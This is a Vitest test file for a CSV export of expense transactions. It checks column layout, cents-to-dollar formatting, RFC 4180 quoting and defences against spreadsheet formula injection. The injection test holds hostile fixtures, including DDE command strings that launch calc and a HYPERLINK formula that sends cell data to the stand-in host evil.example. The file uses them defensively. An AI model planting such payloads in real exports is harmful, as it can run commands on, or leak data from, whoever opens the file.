import { describe, expect, it } from "vitest";
import { buildExportCsv, type CsvTxnRow } from "../src/lib/csvExport";

const rows: CsvTxnRow[] = [
  {
    id: "t2", txn_date: "2026-05-30", merchant: "The Grounds", cat_key: "meals",
    amount_cents: -3300, gst_cents: 300, deductible_pct: 50,
    payment_method: "card", note: "client lunch, with comma",
  },
  {
    id: "t1", txn_date: "2026-05-12", merchant: "Officeworks", cat_key: "office",
    amount_cents: -8800, gst_cents: 800, deductible_pct: 100,
    payment_method: null, note: null,
  },
];

// Receipt key only for t2; t1 has no image.
const receiptKeys = new Map<string, string>([["t2", "u/u1/r/abc.jpg"]]);

describe("buildExportCsv", () => {
  it("emits the documented header, the exact column row, dollars from cents, and a signed receipt_url", async () => {
    const csv = await buildExportCsv({
      profileName: "Acme Pty Ltd",
      periodLabel: "May 2026",
      rows,
      receiptKeyByTxnId: receiptKeys,
      baseUrl: "https://api.test",
      signDownload: async (key) => `tok(${key})`,
    });
    const lines = csv.split("\n");

    // Line 0: the doc/header comment naming profile + period.
    expect(lines[0]).toContain("Acme Pty Ltd");
    expect(lines[0]).toContain("May 2026");

    // Line 1: the exact column header.
    expect(lines[1]).toBe(
      "date,merchant,category,amount_incl_gst,gst,deductible_pct,payment_method,note,receipt_url",
    );

    // Line 2: t2 first (input order preserved), dollars from cents (-33.00),
    // gst 3.00, comma-bearing note quoted, signed receipt_url present.
    expect(lines[2]).toContain("2026-05-30");
    expect(lines[2]).toContain("The Grounds");
    expect(lines[2]).toContain("meals");
    expect(lines[2]).toContain("-33.00");
    expect(lines[2]).toContain("3.00");
    expect(lines[2]).toContain("50");
    expect(lines[2]).toContain('"client lunch, with comma"');
    expect(lines[2]).toContain("https://api.test/export/dl/tok(u/u1/r/abc.jpg)");

    // Line 3: t1 -88.00, no receipt -> empty receipt_url (trailing comma).
    expect(lines[3]).toContain("2026-05-12");
    expect(lines[3]).toContain("Officeworks");
    expect(lines[3]).toContain("-88.00");
    expect(lines[3]!.endsWith(",")).toBe(true); // empty receipt_url is the last field
  });

  it("neutralizes formula injection (CWE-1236) in text fields", async () => {
    const csv = await buildExportCsv({
      profileName: "=cmd|'/c calc'!A1",
      periodLabel: "May 2026",
      rows: [{
        id: "x", txn_date: "2026-05-01",
        merchant: '=HYPERLINK("http://evil.example/?d="&A1,"Receipt")',
        cat_key: "=danger()", amount_cents: -3300, gst_cents: -300, deductible_pct: 100,
        payment_method: "@SUM(A1:A9)", note: "-2+3+cmd|' /C calc'!A0",
      }],
      receiptKeyByTxnId: new Map(),
      baseUrl: "https://api.test",
      signDownload: async () => "tok",
    });
    const lines = csv.split("\n");

    // Profile name in the comment line is prefixed with a single quote.
    expect(lines[0]).toContain("'=cmd");
    // A formula-leading merchant is wrapped (it has a comma) AND prefixed with '.
    expect(lines[2]).toContain(`"'=HYPERLINK`);
    // payment_method (@...) and note (-...) are prefixed with a leading quote.
    expect(lines[2]).toContain("'@SUM(A1:A9)");
    expect(lines[2]).toContain("'-2+3");
    // category (cat_key) is now neutralized too (L7).
    expect(lines[2]).toContain("'=danger()");
    // Legitimate negative dollar amounts are numeric columns — NOT prefixed.
    expect(lines[2]).toContain("-33.00");
    expect(lines[2]).not.toContain("'-33.00");
  });

  it("quotes fields containing commas, quotes, or newlines (RFC 4180)", async () => {
    const csv = await buildExportCsv({
      profileName: "P", periodLabel: "May 2026",
      rows: [{
        id: "x", txn_date: "2026-05-01", merchant: 'Bob "the" Builder', cat_key: "office",
        amount_cents: -100, gst_cents: null, deductible_pct: null,
        payment_method: null, note: null,
      }],
      receiptKeyByTxnId: new Map(),
      baseUrl: "https://api.test",
      signDownload: async () => "tok",
    });
    // A double-quote inside a field is doubled and the field is wrapped in quotes.
    expect(csv).toContain('"Bob ""the"" Builder"');
  });
});
